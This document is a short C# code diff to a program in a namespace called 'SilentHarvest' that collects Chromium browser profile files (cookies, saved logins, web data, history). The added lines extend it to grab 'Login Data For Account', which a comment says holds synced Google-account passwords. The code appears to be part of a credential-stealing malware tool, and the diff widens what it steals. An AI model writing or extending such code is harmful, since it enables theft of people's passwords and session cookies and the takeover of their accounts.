@@ -340,6 +340,8 @@ namespace SilentHarvest
                         new string[] { "Cookies",  Path.Combine(pd, @"Network\Cookies") },
                         new string[] { "Cookies2", Path.Combine(pd, "Cookies") },
                         new string[] { "LoginData", Path.Combine(pd, "Login Data") },
+                        // synced Google-account passwords live here (GPM), not in Login Data
+                        new string[] { "LoginDataAcct", Path.Combine(pd, "Login Data For Account") },
                         new string[] { "WebData",  Path.Combine(pd, "Web Data") },
                         new string[] { "History",  Path.Combine(pd, "History") },
                     };
@@ -356,6 +358,7 @@ namespace SilentHarvest
                             if (f[0] == "Cookies") rel = @"Network\Cookies";
                             else if (f[0] == "Cookies2") rel = "Cookies";
                             else if (f[0] == "LoginData") rel = "Login Data";
+                            else if (f[0] == "LoginDataAcct") rel = "Login Data For Account";
                             else if (f[0] == "WebData") rel = "Web Data";
                             else rel = "History";
                             if (prof != ".")
